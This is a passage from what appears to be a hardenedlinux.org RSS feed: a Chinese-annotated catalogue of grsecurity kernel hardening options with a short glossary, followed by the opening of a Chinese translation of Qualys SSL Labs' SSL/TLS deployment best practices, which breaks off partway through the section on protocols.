&lt;p&gt;&lt;strong&gt;Fork failure logging&lt;/strong&gt; 【（GRKERNSEC_FORKFAIL、kernel.grsecurity.forkfail_logging）所有失败的fork()尝试都会被记录。这可能意味着fork炸弹，或有人正试图使他们的程序越权。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Time change logging&lt;/strong&gt; 【（GRKERNSEC_TIME、kernel.grsecurity.timechange_logging）所有系统时钟的改变都将被记录】&lt;/p&gt;

&lt;p&gt;**/proc/&lt;pid&gt;/ipaddr support** 【（GRKERNSEC_PROC_IPADDR）如果选是，一个包含用户IP地址的新条目将会被加在每个/proc/&lt;pid&gt;目录下。The IP is carried across local TCP and AF_UNIX stream sockets.This information can be useful for IDS/IPSes to perform remote response to a local attack.这个条目只能被进程的所有者看见（root用户也能看见，如果他拥有CAP_DAC_OVERRIDE。这可以通过RBAC系统删除。）因此不会产生相关的隐私】&lt;/pid&gt;&lt;/pid&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Denied RWX mmap/mprotect logging&lt;/strong&gt; 【（GRKERNSEC_RWXMAP_LOG、kernel.grsecurity.rwxmap_logging）如果选是，当被PAX_MPROTECT阻止时，calls to mmap() and mprotect() with explicit usage of PROT_WRITE and PROT_EXEC together将会被记录。 这个feature也会记录其他的当PAX_MPROTECT开启时可能有问题的方案，比如textrels and PT_GNU_STACK】&lt;/p&gt;

&lt;h3 id=&quot;executable-protections&quot;&gt;Executable Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Dmesg(8) restriction&lt;/strong&gt; 【（GRKERNSEC_DMESG、kernel.grsecurity.dmesg）如果选是，非root用户将无法使用dmesg命令查看内核环日志缓冲。内核日志缓冲经常包含有内核地址和其他对攻击者有用的标识信息，in fingerprinting（数字指纹） a system for a targeted exploit。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deter ptrace-based process snoopin&lt;/strong&gt; 【（GRKERNSEC_HARDEN_PTRACE、kernel.grsecurity.harden_ptrace）如果选是，通过ptrace实现的tty嗅探程序和其他恶意监督程序将被阻止。如果你一直使用着RBAC系统，那所有用户的这个选项已经启用了好几年了，with the ability to make fine-grained（细粒度？） exceptions. 这个选项只会影响到非root用户ptrace到其他不是ptrace的子孙进程的能力。 This means that strace ./binary and gdb ./binary will still work, but attaching to arbitrary processes will not.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Require read access to ptrace sensitive binaries&lt;/strong&gt; 【（GRKERNSEC_PTRACE_READEXEC、kernel.grsecurity.ptrace_readexec）如果选是，没有权限的用户将不能ptrace不可读的二进制程序。这个选项对在移除了有suid的二进制程序的可读权限后的环境很有用——可防止内容泄露。  这个选项增加了这种文件使用的稳定性，因为当没有执行权限且ptracing时，二进制程序能被正常地读取。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enforce consistent multithreaded privileges&lt;/strong&gt; 【（GRKERNSEC_SETXID、kernel.grsecurity.consistent_setxid）If you say Y here, a change from a root uid to a non-root uid in a multithreaded application will cause the resulting uids, gids, supplementary(增补的） groups, and capabilities in that thread to be propagated（传送，扩散） to the other threads of the process.  在大多数情况下这是不必要的，因为glibc在应用程序的维护上会仿真这个行为。  其他的libc不会做同样的事情——允许进程的其他线程以root权限继续运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disallow access to overly-permissive（过分宽松） IPC objects&lt;/strong&gt; 【（GRKERNSEC_HARDEN_IPC、kernel.grsecurity.harden_ipc)如果选是，过分宽松的IPC对象通道（共享内存、队列信息和信号量）将被禁止，进程将在正常权限下加入以下准则检查：1、If the IPC object is world-accessible and the euid doesn’t match that of the creator or current uid for the IPC object&lt;em&gt;（//IPC对象是否可访问以及euid是否与创建者或现在IPC对象的uid不匹配）&lt;/em&gt; 2、If the IPC object is group-accessible and the egid doesn’t match that of the creator or current gid for the IPC object。  [It’s a common error to grant too much permission to these objects, with impact ranging from denial of service and information leaking to privilege escalation.]&lt;em&gt;（授予这些对象太多权限是一个常见的错误，权限的提高可能导致拒绝服务和信息泄露）&lt;/em&gt;。  拥有CAP_IPC_OWNER属性的进程仍然可以access these IPC objects.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Trusted Path Execution (TPE)&lt;/strong&gt; 【（GRKERNSEC_TPE、kernel.grsecurity.tpe、kernel.grsecurity.tpe_gid）如果选是，你将可以选择一个GID加入增补的组中，里面的成员都被标记为”untrusted.”这些用户将不能执行在只有root能写入的但不属于root用户的目录中的所有文件。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Partially restrict（局部限制） all non-root users&lt;/strong&gt; 【（GRKERNSEC_TPE_ALL、kernel.grsecurity.tpe_restrict_all）如果选是，所有非root用户都将在一个削弱的TPE限制下。 This is separate from, and in addition to, the main TPE options that you have selected elsewhere.&lt;em&gt;（//与你在别处选择的TPE选项有区别，并且效果叠加？）&lt;/em&gt;  因此，如果一个”trusted” GID被选择，这个限制同样会应用在这个GID上。 Under this restriction, all non-root users will only be allowed to execute files in directories they own that are not group or world-writable, or in directories owned by root and writable only by root.&lt;em&gt;（在这个限制下，所有非root用户只被允许执行属于他们自己 并且&lt;/em&gt;不是&lt;em&gt;一个组或可写入的目录、或属于root且只能被root写入的目录下的文件。）&lt;/em&gt;】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Invert（反转？） GID option&lt;/strong&gt; 【（GRKERNSEC_TPE_INVERT、kernel.grsecurity.tpe_invert）如果选是，the group you specify in the TPE configuration will decide what group TPE restrictions will be &lt;em&gt;disabled&lt;/em&gt; for.&lt;em&gt;（你在TPE配置中指定的组将判断那些TPE组限制将会被禁用）&lt;/em&gt;  如果你想TPE限制应用在大多数用户上，这个选项很有用。  Unlike other sysctl options, this entry will default to on for backward-compatibility.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;GID for TPE-untrusted users&lt;/strong&gt; 【（GRKERNSEC_TPE_UNTRUSTED_GID）Setting this GID determines what group TPE restrictions will be &lt;em&gt;enabled&lt;/em&gt; for.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;GID for TPE-trusted users&lt;/strong&gt; 【（GRKERNSEC_TPE_TRUSTED_GID）Setting this GID determines what group TPE restrictions will be &lt;em&gt;disabled&lt;/em&gt; for.】&lt;/p&gt;

&lt;h3 id=&quot;network-protections&quot;&gt;Network Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Larger entropy pools&lt;/strong&gt; 【（GRKERNSEC_RANDNET）如果选是，用来存放Linux和Grsecurity的各种features的entropy pool的大小会翻倍。由于有些Grsecurity的features使用附加的随机性，所有建议你在这里选是——相当于修改/proc/sys/kernel/random/poolsize】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TCP/UDP blackhole and LAST_ACK DoS(Denial of Service, 拒绝服务攻击)prevention&lt;/strong&gt; 【（GRKERNSEC_BLACKHOLE、kernel.grsecurity.ip_blackhole、kernel.grsecurity.lastack_retries）如果选是，当外来数据包发送到没有程序监听的端口上，TCP重置和ICMP目标不可达数据包都不会被发送来相应该外来数据包。这个features支持IPV4和IPV6并且可以绕过回环网卡避免转发到黑洞。启用这个选项是主机对DoS攻击变得更有适应力（更主动），还能减少对扫瞄者的可视度。  这里的blackhole features实现相当于FreeBSD的blackhole feature，它对所有数据包不只是SYNs阻止RST（reset）响应。  在大多数程序执行下这不会造成问题，但程序（如haproxy）可能不会通过在远程端干净利落地终止他们来关闭特定的连接，从而让远程主机停留在LAST_ACK状态。 Because of this side-effect and to prevent intentional LAST_ACK DoSes,所有这个特性也增加automatic mitigation来应对这类攻击。  这个mitigation大幅度地减少一个socket花费在LAST_ACK state的时间。 如果你正使用haproxy并且不是所有的正连接的服务器都启用了这个选项，那在haproxy主机上禁用这个选项。  如果sysctl可用，两个名为”ip_blackhole” and “lastack_retries”的选项将被产生。当ip_blackhole进行标准的 0/非0、开/关 切换时，lastack_retries使用相同的值（”tcp_retries1” and “tcp_retries2”）。 默认的值 4 阻止一个socket保持LAST_ACK状态45秒。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable TCP Simultaneous（同时的） Connect&lt;/strong&gt; 【（GRKERNSEC_NO_SIMULT_CONNECT）如果选是，该特性将会移除Linux的strict implementation of TCP的缺点——允许两个没有均进入监听状态的client相互连接。这个缺点可以让一个攻击者很容易地阻止一个client连接上一个已知的一提供正确连接端口的服务器。  因为这个缺点可能被用来阻止杀毒软件或者IPS from fetching updates，或者阻止SSL网关获取CRL，因此这个弱点应该通过启用这个选项除去。  虽然Linux是为数不多的支持同时连接的操作系统之一，当这在现实中没有合理的用途，并且缺少防火墙的支持。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Socket restrictions&lt;/strong&gt; 【（GRKERNSEC_SOCKET）如果选是，你可以选择以下几个选项。如果你在你的系统上分配一个GID并且把它作为额外的用户组——你希望限制其中的用户对socket的访问，这个patch将表现为基于你的选项表现为三种状态。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny any sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_ALL、kernel.grsecurity.socket_all、kernel.grsecurity.socket_all_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能通过该机器连接到其他主机上或在该机器上运行服务端应用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny all sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_ALL_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny client sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_CLIENT、kernel.grsecurity.socket_client、kernel.grsecurity.socket_client_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能通过该机器连接到其他主机上，但可以运行服务。 如果这个选项启用，当你的机器在shell中启动ftp transfers时，所有在这个组里的用户将必须使用passive mode（被动模式？）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny client sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_CLIENT_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny server sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_SERVER、kernel.grsecurity.socket_server、kernel.grsecurity.socket_server_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能在该机器上运行服务端应用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny server sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_SERVER_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;h3 id=&quot;physical-protections&quot;&gt;Physical Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Deny new USB connections after toggle&lt;/strong&gt; 【（GRKERNSEC_DENYUSB、kernel.grsecurity.deny_new_usb）如果选是，一个新的名为”deny_new_usb”的sysctl选项将被生成。 将这个选项设为1将阻止任何被OS识别的新的USB设备。所有USB设备的插入记录都会被记录。  这个选项被用来在各种USB设备中阻止被设计为渗透漏洞的USB。  为了最大的效益，在相关的启动脚本执行后这个sysctl应该被设置。  如果在发行版中的每一个用户都可以选择是否切换这个sysctl，那启用这个选项是安全的】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Reject all USB devices not connected at boot&lt;/strong&gt; 【（GRKERNSEC_DENYUSB_FORCE）如果选是，一个将不生成sysctl项目的GRKERNSEC_DENYUSB的变型会被启用（意味着编译后无法再动态改变）。这个选项应该只在你确定要拒绝所有运行时的USB连接、并且不再改变初始化脚本时才启用。 这个选项不应该被distros启用。 It forces the core USB code to be built into the kernel image so that all devices connected at boot time can be recognized and new USB device connections can be prevented prior to init running.&lt;em&gt;（//强制USB的代码被build在kernel image里，以使所有在开机时就已连接的设备能被识别，并且新的USB设备将会被阻止。）&lt;/em&gt;】&lt;/p&gt;

&lt;h3 id=&quot;sysctl-support&quot;&gt;Sysctl Support&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Sysctl support&lt;/strong&gt; 【（GRKERNSEC_SYSCTL）如果选是，你可以改变Grsecurity的开机选项，而不用重新编译内核。  你可以echo 变量的值到/proc/sys/kernel/grsecurity目录来开启（1）或禁用（0）各种features。”grsec_lock”条目被设置成非0值之前，所有sysctl条目都是可变的。  如果你没有在开机时对”Turn on features by default”选项选是，所有内核配置中可用的feature都将不可用。  所有选项应被设置为startup，并且当所有选项设置好后grsec_lock应该被设置成非零值。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Extra sysctl support for distro（发行版） makers (READ HELP)&lt;/strong&gt; 【（GRKERNSEC_SYSCTL_DISTRO）如果选是，将会生成附加的sysctl选项用来控制针对root下运行进程的features。因此，当grsec_lock在开机后被启用了，使用这个选项很重要。    Only distros with prebuilt kernel packages with this option enabled that can ensure grsec_lock is enabled after boot should use this option.  &lt;em&gt;Failure to set grsec_lock after boot makes all grsec features this option covers useless&lt;/em&gt; 。目前这个选项生成如下sysctl项目：”Disable Privileged I/O”: “disable_priv_io”】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Turn on features by default&lt;/strong&gt; 【（GRKERNSEC_SYSCTL_ON）如果选是，所有内核配置选项中选用的features都会在开机时被启用。 建议你选是，除非因为某些原因你想默认禁用所有sysctl可调的features。  就像其他地方提到的，在你完成对sysctl项目的修改之后启用grsec_lock项目非常重要。】&lt;/p&gt;

&lt;h3 id=&quot;logging-options&quot;&gt;Logging Options&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Seconds in between log messages (minimum)&lt;/strong&gt; 【（GRKERNSEC_FLOODTIME）这个选项允许你设定Grsecurity生成日志的时间。默认选项应该适合大多数人，如果你要更改它，选择一个足够小的数来允许生成能提供信息的日志，但应足够大以防止泛洪。  设定这个值并且将GRKERNSEC_FLOODBURST设为0，能防止Grsecurity日志的任何限制发生的概率】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Number of messages in a burst (maximum)&lt;/strong&gt; 【（GRKERNSEC_FLOODBURST）This option allows you to choose the maximum number of messages allowed within the flood time interval you chose in a separate option.  默认选项应该适合大多数人, 然而，如果你发现你的许多日志被解释为flooding，你可能需要提高这个值。Setting both this value and GRKERNSEC_FLOODTIME to 0 will disable any rate limiting on grsecurity log messages.】&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;知识索引&lt;/h2&gt;

&lt;p&gt;1、TPE:Tursted Path Execution， 是Linux内核模块。
【Trusted Path Execution (TPE) is a feature that basically denies users the ability to execute programs that are not owned by the root user, or that they can write to. This prevents all kinds of exploits（漏洞利用程序） that would have otherwise rooted your system.】&lt;/p&gt;

&lt;p&gt;2、MPROTECT：
【The goal of MPROTECT is to help prevent the introduction of new executable code into the task’s address space. This is accomplished by restricting the mmap() and mprotect() interfaces.】
   The restrictions prevent
   - creating executable anonymous mappings
   - creating executable/writable file mappings
   - making an executable/read-only file mapping writable except for performing
     relocations on an ET_DYN ELF file (non-PIC shared library)
   - making a non-executable mapping executable&lt;/p&gt;

&lt;p&gt;3、PTE( page table entries， 页表项)&lt;/p&gt;

&lt;p&gt;4、NX（No Excute， 不可执行）&lt;/p&gt;

&lt;p&gt;5、ASLR（Address space layout randomization） 【是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。】&lt;/p&gt;

&lt;p&gt;6、kexec 【kexec 是 Linux 内核的一个补丁，让您可以从当前正在运行的内核直接引导到一个新内核。在上面描述的引导序列中，kexec 跳过了整个引导装载程序阶段（第一部分）并直接跳转到我们希望引导到的内核。不再有硬件的重启，不再有固件操作，不再涉及引导装载程序。完全避开了引导序列中最弱的一环 – 固件。这一功能部件带来的最大益处在于，系统现在可以极其快速地重新启动。】&lt;/p&gt;

&lt;p&gt;7、Linux下设置端口权限的系统调用:
ioperm 【为调用进程设置I/O端口访问权能。ioperm的使用需要具有超级用户的权限，只有低端的[0-0x3ff] I/O端口可被设置，要想指定更多端口的权能，可使用iopl函数。这一调用只可用于i386平台。】&lt;/p&gt;

&lt;p&gt;iopl 【该调用用于修改当前进程的操作端口的权限。可以用于所有65536个端口的权限。因此，ioperm相当于该调用的子集。和ioperm一样，这一调用仅适用于i386平台。】&lt;/p&gt;

&lt;p&gt;8、hwclock 【用来显示与设定硬件时钟。在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。】&lt;/p&gt;

&lt;p&gt;9、shmat(把共享内存区对象映射到调用进程的地址空间)：连接共享内存标识符为shmid的共享内存，连接成功后把共享内存区对象映射到调用进程的地址空间，随后可像本地空间一样访问&lt;/p&gt;

&lt;p&gt;10、dmesg 【dmesg用来显示开机信息，kernel会将开机信息存储在ring buffer中。若是开机时来不及查看信息，可利用dmesg来查看。开机信息亦保存在/var/log目录中，名称为dmesg的文件里。】&lt;/p&gt;

&lt;p&gt;11、ptrace 【ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。】&lt;/p&gt;

&lt;p&gt;12、ACK 【ACK (Acknowledgement），即确认字符，在数据通信中，接收站发给发送站的一种传输类控制字符。表示发来的数据已确认接收无误。在TCP/IP协议中，如果接收方成功的接收到数据，那么会回复一个ACK数据。通常ACK信号有自己固定的格式,长度大小,由接收方回复给发送方。其格式取决于采取的网络协议。当发送方接收到ACK信号时，就可以发送下一个数据。如果发送方没有收到信号，那么发送方可能会重发当前的数据包，也可能停止传送数据。具体情况取决于所采用的网络协议。】&lt;/p&gt;

&lt;p&gt;13、IPC 【Inter-Process Communication，进程间通信】&lt;/p&gt;
</description>
        <pubDate>Mon, 17 Aug 2015 12:46:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/08/17/Grsecurity_catalogue_cn.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/08/17/Grsecurity_catalogue_cn.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>SSL/TLS部署最佳实践v1.4</title>
        <description>&lt;p&gt;译者：Shawn the R0ck( 1.3), Tom Li( 1.4)&lt;/p&gt;

&lt;p&gt;Reviewers: Lenx Wei&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;https://www.ssllabs.com/downloads/SSL_TLS_Deployment_Best_Practices.pdf&quot;&gt;SSL/TLS Deployment Best Practices&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者：Ivan Ristić&lt;/p&gt;

&lt;p&gt;version 1.4 (8 December 2014)&lt;/p&gt;

&lt;p&gt;Copyright © 2012-2014 Qualys SSL Labs&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;摘要：&lt;/h2&gt;

&lt;p&gt;SSL/TLS是一个看似简单的技术。非常容易部署和让她跑起来，但是…她真的跑
起来了吗？第一部分是真的 —— SSL确实容易部署 —— 然而正确部属她并不容易。
为了确保TLS提供安全性，系统管理员和开发者必须投入额外的精力，去配置服务器和
编写应用程序。&lt;/p&gt;

&lt;p&gt;2009年，我们在&lt;a href=&quot;https://www.ssllabs.com/&quot;&gt;SSL Labs&lt;/a&gt;开始了相关工作，因为我
们想明白TLS到底是在怎么样被使用，我们也打算弥补TLS缺乏易用的工具和文档
的局面。我们进行了对全局TLS使用情况的完整调查，以及实现了在线检测工具，但文
档缺乏的问题依然存在。这份文档是解决这个问题过程中的一步。&lt;/p&gt;

&lt;p&gt;我们的目标是让已经不堪负重的系统管理员和程序员尽可能花费少量时间就能完
成安全站点或Web应用的部署，正是因为我们的目的如此，所以这份文档可能不够完备，遗漏了
一些高级主题。因此，我们只提供简单实用容易理解的建议。
对于那些想了解更多信息的读者，可以看看 Section 6。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;1. 私钥和证书&lt;/h2&gt;

&lt;p&gt;TLS提供的安全质量完全依赖于私钥和证书。私钥是安全的基础，而证书则用于向访问者表明
服务器的身份。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;1.1 使用2048位的私钥&lt;/h3&gt;

&lt;p&gt;在你的所有服务器上使用2048位的RSA，或者等价强度的256位ECDSA私钥。密钥的强度能
保证在相当长时间内的安全，如果你已经使用1024位的RSA，尽快替换它们。如果你
的安全需求必须使用大于2048位的密钥，请考虑ECDSA，因为性能不错。不过ECDSA的缺点
是小部分客户端不支持，因此你有可能需要同时部署RSA和ECDSA以确保互操作性。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：RSA 1024的强度相当于分组加密的80-96bit，已经被视为不安全。[T1]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-3&quot;&gt;1.2 保护私钥&lt;/h3&gt;

&lt;p&gt;私钥是重要的资产，尽可能限制能接触到私钥的人。推荐策略包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在一台可信的计算机(Shawn注:加固过的物理机器)上生成私钥和CSR(
Certificate Signing Requests)。有一些CA会为你生成密钥和CSR，但这样做
明显不妥。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;受密码保护的密钥可以防止从备份系统中泄漏。然而私钥密码在生产系统中使用的
帮助是有限的，因为这并不能阻止一个聪明的攻击者从进程内存中截获私钥。
一些硬件设备可以在服务器被攻陷的情况下确保私钥安全，但这些昂贵的设备
只在对安全有严格要求的机构中使用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在发现系统被攻陷后，吊销老的证书，生成新的密钥和证书。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;每年更新证书，同时更新私钥。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-4&quot;&gt;1.3 确保充分的域名覆盖&lt;/h3&gt;

&lt;p&gt;确保你的证书覆盖到目标站点的所有活跃域名。比如你的主站是www.example.com，但
你可能还有个www.example.net。你的目标就是避免无效证书警告，因为那会让你
的用户产生疑惑从而影响对你的信任。&lt;/p&gt;

&lt;p&gt;即使你的服务器只有一个主机名配置，也要记得你不能控制用户是通过什么路径
访问你的站点的，可能是其他的链接过来的。大部分情况下，你应该保证证书能
在没有www前缀的情况下工作(比如，example.com和www.example.com)。这里经验法则
就是：一个安全的WEB服务器应该有一个对所有DNS名称解析都合法的证书配置。&lt;/p&gt;

&lt;p&gt;通配符证书(Wildcard certificates)有它的适用场景。但如果这样的配置意味着
暴露私钥给不必要的人群（特别是在跨越部门边界的情形下），则应该避免使用。
换句话说，越少的人能访问私钥越好。此外，要意识到共享证书可能会导致安全漏洞
从一个站点扩散到所有使用相同证书的站点。&lt;/p&gt;

&lt;h3 id=&quot;ca&quot;&gt;1.4 从靠谱的CA那里获得证书&lt;/h3&gt;

&lt;p&gt;选择一个对待安全业务认真可靠的CA( Certificate Authority)。在选择CA过程
中考虑以下因素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对待安全的态度&lt;/p&gt;

    &lt;p&gt;大多的CA都会有常规的安全审计（否则根本没有资格当CA），但是其中一些会更重视
安全。搞清楚哪些更重视安全不是一件容易的事情，但一个可行的做法
是看看他们在安全方面的历史状况，他们如何响应攻击事件以及如何从错误中学习。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;足够大的市场占有率&lt;/p&gt;

    &lt;p&gt;满足此因素的CA不太可能轻易撤销所有证书，而这种事情过去曾发生在小的CA身上。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;业务重心&lt;/p&gt;

    &lt;p&gt;如果一家机构的核心业务是CA，那么一旦出现严重问题，他们将会受到严重影响。
因此这些CA不太可能因为追逐利润而忽视证书部门的重要性。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;提供哪些服务&lt;/p&gt;

    &lt;p&gt;在最底线的情况，你选择的CA至少应该提供CRL( Certificate List)和OCSP(
Online Certificate Status Protocol)这两种召回机制，并且提供一个高性能的OCSP服务。
CA至少提供域名验证和扩展证书验证功能，最理想的情况可以让你自己选择公
钥算法(今天大多站点都使用RSA，但在未来ECDSA的性能优势可能会变得重要。)&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;Shawn注：这里作者可能指的是ECDH/ECDHE_ECDSA，即ECDH密钥交换+ECDSA签名的证书或者ECDH算出TLS的临时session key+ECDSA签名&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;证书管理选项&lt;/p&gt;

    &lt;p&gt;如果你的运维环境很复杂，需要一大堆的证书，那么选择一个能提供良好管理工具的
CA。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;技术支持&lt;/p&gt;

    &lt;p&gt;选择一个技术支持优秀的CA提供商。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-5&quot;&gt;1.5 选择强算法签名证书&lt;/h3&gt;

&lt;p&gt;证书签名的安全依赖于签名私钥的强度，以及所使用的哈希函数强度。
今天大多数证书使用并不足够安全的SHA1哈希函数。业界正在逐渐
淘汰SHA1，而最后期限则是2016年末，这之后SHA1证书就不可接受了。&lt;/p&gt;

&lt;p&gt;然而，Google Chrome在大限到来之前就开始对SHA1证书发出警告，如果你的证书
在2015年左右就要到期，你应该立刻替换这些证书。作为替代，你可以直奔SHA2
算法家族。不过在你动手之前，你需要先看看你的用户是否支持SHA2。一些旧客户
端，例如 Windows XP SP2 的 IE 6 就不支持（但依然在一些国家和机构重度使用）。&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;2. 配置&lt;/h2&gt;

&lt;p&gt;使用正确的TLS服务器配置，才能够确保将你的信任凭证正确的展现给站点的访问者，
确保只有安全的加密原语被使用，而且确保规避所有已知的安全风险。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;2.1 部署有效的证书链&lt;/h3&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效和客户端浏览器报警告，这个问题有时候
不是那么容易被检测到，因为有些浏览器可以自己重构一个完整的信任链而有些
则不行。&lt;/p&gt;

&lt;p&gt;在绝大多数部署场景中，仅服务器自身一个证书是不够的。一般需要多个证书建立一个信
任链。一个常见的问题是正确的配置了服务器证书但却忘了包含其他所需要的
证书。此外，虽然这些其他的证书通常有很长的有效期，但它们也会过期。而且一旦它们过
期就会使整个信任链作废。你的CA应该向你提供所有额外需要的证书。&lt;/p&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效，并且导致客户端浏览器报警。而实际上，这个问题有时候
难以诊断，因为有些浏览器可以自己重构一个完整的信任链而其他浏览器则不行。&lt;/p&gt;

&lt;h3 id=&quot;section-8&quot;&gt;2.2 使用安全的协议&lt;/h3&gt;

&lt;p&gt;在SSL/TLS家族中有5种协议：SSLv2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: TLS v1.3还在draft阶段&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v2不安全，坚决不能用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: OpenSSL和GnuTLS当前的版本(2014.12.2)不支持SSL v2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v3用于HTTP已经被确认为不安全，用于其他协议时安全强度也不足。
它已经过时，不应该再被使用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li注: POODLE漏洞的出现彻底的废掉了SSLv3，受其影响，
  大量程序和库彻底取消了对SSLv3的支持。其实之前很多地方支持SSLv3
  的原因是兼容性问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.0在很大程度上是安全的。当用于非HTTP协议时，我们还不知道存在任何
已知的重大安全漏洞。当用于HTTP协议时，我们能够通过精心的服务器配置，来保证
它几乎是安全的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.1和TLS v1.2没有已知的安全漏洞曝光。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: 由于Edward Snowden曝光的内容有关于NSA“今天记录，明天解密”的故事，
  所以大量的自由软件社区和暗网使者们在过去1年中(2013.7–2014)转向了TLS v1.2的PFS，2015年4月，[PCI-DSS v3.1] (https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-1.pdf)规定所有SSL的版本以及早期TLS版本将于2016年6月30日后不再支持)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：某一些TLS 1.x实现由于没有正确实现对PADDING的校验，同样存在POODLE脆弱性问题。
  这些有问题的TLS实现包括F5，A10，Checkpoint, Cisco等厂家的设备。
  同样，Lucky 13攻击一样对老版本的OpenSSL, GnuTLS，F5等大量库/设备实现有效。
  请确认打上补丁。[T2][T3]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;TLS v1.2应该成为你的主要协议。这个版本有巨大的优势是因为它有之前版本
